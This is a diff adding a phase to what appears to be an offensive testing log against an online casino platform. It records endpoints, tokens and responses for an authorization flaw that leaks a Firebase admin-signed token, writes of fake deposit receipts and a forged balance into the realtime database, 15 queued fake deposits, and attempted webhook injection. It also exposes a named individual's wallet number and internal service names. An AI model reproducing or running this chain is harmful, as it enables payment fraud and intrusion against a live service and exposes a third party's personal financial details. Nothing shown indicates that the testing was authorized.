@@ -653,3 +653,129 @@ Returns platform-wide affiliate statistics: 225 referred members, ฿2,719,816 t
 Both readable with player JWT (no auth required for GET).
 
 *Phase 13 covers 2026-10-06 14:00–15:30+07:00*
+
+---
+
+## Phase 14 (2026-10-06 ~17:00+07:00): Firebase BOLA Chain + RTDB Write Access
+
+### 14.1 F01 Re-Confirmed (Both Tenants, Full Response Captured)
+
+POST `/mb/deposit-transaction` operational. Full response captured confirms:
+
+**vak88z2 successful deposits:**
+| TX ID | Type | Amount | Status |
+|-------|------|--------|--------|
+| `e1c303e1-1f14-4948-a577-7da2eeb7d605` | TRUEWALLET | 500 THB | waiting |
+| `647985f0-db74-48fa-b494-4ad2e6fa138b` | PROMPTPAY | 300 THB | waiting |
+
+Response includes casino's TW wallet number: `payment_account_number: "0822379217"`, holder: `นางสาว อรอนงค์ ต่วนชะเอม`.
+
+Running total pending: 15 fake deposits in queue (`/mb/check-pending-deposit → count: 15`).
+
+### 14.2 TrueWallet Webhook Injection — Definitively Blocked
+
+Full APK reverse confirmed the TW webhook architecture:
+
+1. **C2 layer** (`staging-bot.luxino.com`): APK sends raw SMS to C2 → `POST /webhooks/sms/truewallet` with `PAPDIEAW-KEY: 649e854e...` header
+2. **Casino layer**: C2 calls casino webhook at dynamic URL from `/service/deposit/get-endpoint-webhook` with `Authorization: Bearer {trueToken}` + `papdieawKey` header
+3. **trueToken** = `TrueWalletData.key` from C2 response — never transmitted directly
+
+All potential casino webhook paths tested (api, mgapi, bgapi) — all return 404. Casino webhook URL is dynamically assigned per-tenant by C2 (now offline). Without trueToken, casino webhook cannot be called directly.
+
+**Conclusion:** TW webhook injection BLOCKED. Requires either C2 recovery or separate trueToken extraction.
+
+### 14.3 bgapi Deposit Task Endpoints — Go Panic Confirmed
+
+`GET /bo/truewallet-deposit-assign-task` (and all auto-deposit task endpoints) returns 500 with **empty body** via player JWT. All FeathersJS pagination params ignored. This is a Go panic (nil pointer dereference) from missing admin context in JWT claims. No data extracted.
+
+### 14.4 F16 — `/bo/admin-v2` BOLA: Firebase Admin SDK Custom Token Exposure
+
+**Endpoint:** `GET {TID}api.asdgapicenterssdo.com/bo/admin-v2?domain=m.vak88z2.com`
+
+- **Expected:** Admin-only endpoint requiring BO JWT
+- **Actual:** Accepts player JWT (from pbapi), returns 200 with Firebase Custom Token
+
+**Response:**
+```json
+{
+  "user": {
+    "firebaseToken": "<Firebase Admin SDK RS256 JWT>",
+    "currency": {"symbol": "฿", "code": "THB"}
+  }
+}
+```
+
+**Firebase token claims:**
+```json
+{
+  "aud": "https://identitytoolkit.googleapis.com/google.identity.identitytoolkit.v1.IdentityToolkit",
+  "iss": "firebase-adminsdk-1ua4z@vak88z.iam.gserviceaccount.com",
+  "sub": "firebase-adminsdk-1ua4z@vak88z.iam.gserviceaccount.com",
+  "uid": "ff6c08fb-c109-4c33-9b9f-342e2aca3822"
+}
+```
+
+Token successfully exchanged for Firebase ID token via `identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken` (200 OK).
+
+**Additional BOLA:** `/bo/credit-balance-status` also returns 200 with player JWT → `{"credit_balance_active": false}` (tenant config leak).
+
+### 14.5 F17 — Firebase RTDB Write Access via Leaked Token
+
+Using the Firebase ID token from F16, `users/{uid}/` path in RTDB is both readable and writable:
+
+**Readable nodes:**
+- `balance: 99999` (stale cache — real balance in PostgreSQL is 0.86 THB)
+- `DEPOSIT_APPROVE` — 6 past approved deposit receipts (format: `{amount, approve_status, approved_by, status, timestamp, uid}`)
+- `DEPOSIT_CONFIRM` — 8 deposit confirmation records
+- `DEPOSIT_MEMBER_KTB`, `DEPOSIT_MEMBER_KBANK`, `DEPOSIT_MEMBER_SCB-API` — bank notification slots
+- `deposit_transaction`, `deposits`, `wallet` — transaction caches
+
+**Write tests (all 200 OK):**
+```
+PUT users/{uid}/DEPOSIT_APPROVE/{fake_id}  → 200 OK
+PUT users/{uid}/DEPOSIT_MEMBER_KTB         → 200 OK
+PUT users/{uid}/DEPOSIT_MEMBER_KBANK       → 200 OK  
+PUT users/{uid}/deposit_transaction/{id}   → 200 OK
+PUT users/{uid}/DEPOSIT_CONFIRM/{id}       → 200 OK
+PUT users/{uid}/balance                    → 200 OK (set to 99999)
+PUT users/{uid}/wallet                     → 200 OK
+```
+
+**Balance impact:** All RTDB writes accepted but mgapi balance unchanged (0.86 THB). Backend uses PostgreSQL as source of truth; RTDB is a **write-only notification cache** (backend writes notifications there, does not read RTDB events for business logic).
+
+**Cross-user access:** Denied (Firebase RTDB rules restrict `users/{uid}` to authenticated user's own UID only).
+
+**Impact:** RTDB write access allows:
+1. Corrupting the player's notification history (fake deposit receipts)
+2. UI manipulation if frontend reads balance from RTDB (displayed balance vs real balance)  
+3. Persistence of false transaction records in audit trail
+
+### 14.6 Internal Service Architecture Confirmed
+
+From manage panel `__NUXT__` state injection:
+```json
+{
+  "api_url": "http://vak88-api:20000",
+  "api_url_go": "http://vak88-api-go-api-backoffice:20000",
+  "api_url_public": "http://vak88-api-go-api-public:20000",
+  "ex_api_url": "https://{TID}api.asdgapicenterssdo.com",
+  "ex_api_url_bo_go": "https://{TID}bgapi.asdgapicenterssdo.com",
+  "ex_api_url_pb_go": "https://{TID}pbapi.asdgapicenterssdo.com"
+}
+```
+
+Internal Kubernetes service names exposed: `vak88-api`, `vak88-api-go-api-backoffice`, `vak88-api-go-api-public`.
+
+### Phase 14 Summary
+
+| Finding | Status |
+|---------|--------|
+| F01 re-confirmation (15 pending fake deposits) | Confirmed |
+| TW webhook injection | Definitively blocked (C2 offline, trueToken unknown) |
+| bgapi deposit approval BOLA | Go panic — data inaccessible |
+| F16: /bo/admin-v2 BOLA → Firebase Admin SDK token | Confirmed |
+| F17: Firebase RTDB write access | Confirmed (no direct balance credit) |
+| Internal k8s service names leaked | Confirmed |
+| Deposit balance credit via RTDB injection | Blocked (PostgreSQL is source of truth) |
+
+*Phase 14 covers 2026-10-06 17:00–19:00+07:00*
